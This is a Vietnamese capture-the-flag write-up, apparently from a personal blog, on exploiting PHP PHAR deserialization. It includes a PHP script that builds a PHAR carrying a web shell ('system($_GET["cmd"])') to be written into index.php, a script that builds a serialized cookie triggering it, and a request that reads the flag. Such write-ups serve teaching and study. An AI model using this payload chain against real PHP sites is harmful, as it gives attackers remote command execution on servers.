@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+        <meta charset="UTF-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1.0">
+        <meta name="robots" content="index, follow">
+        
+        <link rel="alternate" type="application/rss+xml" title="RSS" href="https://k4ahr.work/rss.xml">
+        
+        <title> | PHAR type shit</title>
+
+        <link rel="preload" href="https://k4ahr.work/css/style.css" as="style">
+        <link rel="stylesheet" href="https://raw.githack.com/Speyll/suCSS/main/reset-min.css" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://raw.githack.com/Speyll/suCSS/main/suCSS-min.css" crossorigin="anonymous">
+        <link rel="stylesheet" href="https://k4ahr.work/css/style.css">
+        <link rel="stylesheet" href="https://k4ahr.work/css/custom.css">
+
+        <!-- Add favicon with appropriate sizes -->
+        <link rel="icon" href="https:&#x2F;&#x2F;k4ahr.work/favicon.ico">
+        
+    </head>
+    <body>
+        
+        
+        
+        
+        <nav id="nav-bar">
+            
+            <a href="&#x2F;" class="">
+                
+                &#x2F;home&#x2F;
+            </a>
+            
+            <a href="&#x2F;blog" class="">
+                
+                &#x2F;blog&#x2F;
+            </a>
+            
+            <a href="&#x2F;link" class="">
+                
+                &#x2F;link&#x2F;
+            </a>
+            
+            <a href="&#x2F;misc" class="">
+                
+                &#x2F;misc&#x2F;
+            </a>
+            
+            <a href="&#x2F;about" class="">
+                
+                &#x2F;about&#x2F;
+            </a>
+            
+
+            <div class="theme-toggle" id="theme-toggle" role="button" tabindex="0" aria-label="Toggle theme"
+                data-icon-base="https://k4ahr.work/icons.svg"
+                data-icon-dark="#darkMode"
+                data-icon-light="#lightMode"
+                data-sound-src="https://k4ahr.work/click.ogg">
+                <svg class="icon">
+                    <use id="theme-icon"></use>
+                </svg>
+            </div>
+        </nav>
+
+        <main>
+            
+<div class="card a-white">
+  <div class="card-content">
+    <div class="title">
+      PHAR type shit
+    </div>
+    <div class="des">
+      dòng dưới
+    </div>
+    <div class="date">
+      <strong>2025-09-03</strong>
+    </div>
+  </div>
+</div>
+
+<p><img src="https://k4ahr.work/writeups/phar/1.png" alt="" /></p>
+<p>Challenge này là về PHAR (PHP Archive). Ta có thể đơn giản hiểu PHAR là 1 kiểu file nén được thiết kế cho PHP, thường chứa file và metadata. PHAR có 1 đặc điểm là nếu ta gọi các hàm như file_exists(), md5_file(), getimagesize() … với đường dẫn bắt đầu bằng <code>phar://</code>, thì PHP sẽ tự động giải nén PHAR và unserialize phần metadata</p>
+<ul>
+<li>Nghĩa là: nếu trong metadata có 1 object PHP, thì nó sẽ được unserialize → kích hoạt <code>__destruct()</code> / <code>__wakeup()</code> / <code>__toString()</code> trong class đó.</li>
+</ul>
+<p>Sử dụng lỗ hổng này, ta có thể giải chall này như sau:</p>
+<ul>
+<li>Ta có thể upload avatar (ảnh) và server cho phép unserialize cookie <code>user</code></li>
+<li>Trong code có class <code>LogFile::__destruct()</code> chạy <code>md5_file($this-&gt;filename)</code></li>
+<li>Nếu <code>$this-&gt;filename</code> là một đường dẫn <code>phar://...</code>, thì PHP sẽ giải nén metadata của file PHAR, và unserialize object chứa trong đó (không bị giới hạn bởi <code>allowed_classes</code>).</li>
+</ul>
+<p>Tạo payload PHAR:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;?php
+</span><span>class Logger {
+</span><span>    public function __destruct() { }
+</span><span>}
+</span><span>$phar = new Phar(&#39;shell.phar&#39;);
+</span><span>$phar-&gt;startBuffering();
+</span><span>$phar-&gt;addFromString(&#39;test.txt&#39;, &#39;text&#39;);
+</span><span>$phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;);
+</span><span>
+</span><span>// payload: ghi PHP shell vào file index.php
+</span><span>$object = new Logger();
+</span><span>$object-&gt;logs = &#39;/var/www/html/index.php&#39;; 
+</span><span>$object-&gt;request = &#39;&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;&#39;;
+</span><span>
+</span><span>$phar-&gt;setMetadata($object);
+</span><span>$phar-&gt;stopBuffering();
+</span></code></pre>
+<p><strong>Trong metadata của PHAR, ta nhét một object <code>Logger</code>. Object này có property <code>$logs</code> (đường dẫn file sẽ ghi) và <code>$request</code> (nội dung ghi vào). Khi bị unserialize và chạy destructor, nó sẽ mở file <code>$logs</code> rồi ghi <code>$reques</code>t vào → chèn shell vào index.php.</strong></p>
+<p>Tiếp là tạo cookie <code>user</code>:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>&lt;?php
+</span><span>class LogFile { public $filename; }
+</span><span>$o = new LogFile();
+</span><span>$o-&gt;filename = &quot;phar://upload/&lt;username&gt;/shell.jpg&quot;;
+</span><span>echo base64_encode(serialize($o));
+</span></code></pre>
+<p>Từ đó sử dụng cookie ta vừa gen được, khi hệ thống unserialize cookie này, destructor <code>LogFile::__destruct()</code> chạy:</p>
+<pre style="background-color:#2b303b;color:#c0c5ce;"><code><span>md5_file(&quot;phar://upload/&lt;username&gt;/shell.jpg&quot;)
+</span></code></pre>
+<p>Việc gọi md5_file trên <code>phar://</code> sẽ tự động unserialize metadata → lúc này object <code>Logger</code> được kích hoạt.</p>
+<p>Cuối cùng sử dụng <code>curl</code> hoặc Burp Suite, truy cập vào <code>/?page=index.php&amp;cmd=cat+/flag.txt</code> kèm cookie vừẽa rồi, lệnh <code>system()</code> sẽ in nội dung flag.</p>
+
+
+        </main>
+
+        <footer>
+            
+    <h2><i>"Cuộc đời còn bao nhiêu điều mình sẽ mãi chưa làm"</i></h2>
+    <section id="button">
+        <img src="https://k4ahr.work/button/k4ahr.gif" title="My webring button, use this if you want to add me to your website." style="display: inline-block;" width="88">
+        <a href="https://www.youtube.com/watch?v=9mA7h1jfxc8"><img src="https://k4ahr.work/button/ngot.gif" style="display: inline-block;" width="88"></a>
+        <img src="https://k4ahr.work/button/cinnamonroll.gif" style="display: inline-block;" width="88">
+        <img src="https://k4ahr.work/button/insanity.gif" style="display: inline-block;" width="88">
+        <img src="https://k4ahr.work/button/miku.gif" style="display: inline-block;" width="88">
+    </section>
+
+    <p id="changelog">&copy; 2024 K4ahr, <a href="https://gitlab.com/K4ahr/zola-site">open-sourced</a> under the <a href="https://opensource.org/license/mit">MIT License</a></p>
+    <p>Made using <a rel="noopener noreferrer" href="https://github.com/Speyll/anemone" target="_blank">anemone</a> Zola theme</p>
+  
+        </footer>
+
+        <!-- Move JS to end of body and add defer -->
+        <script src="https://k4ahr.work/js/script.js" defer></script>
+    </body>
+</html>
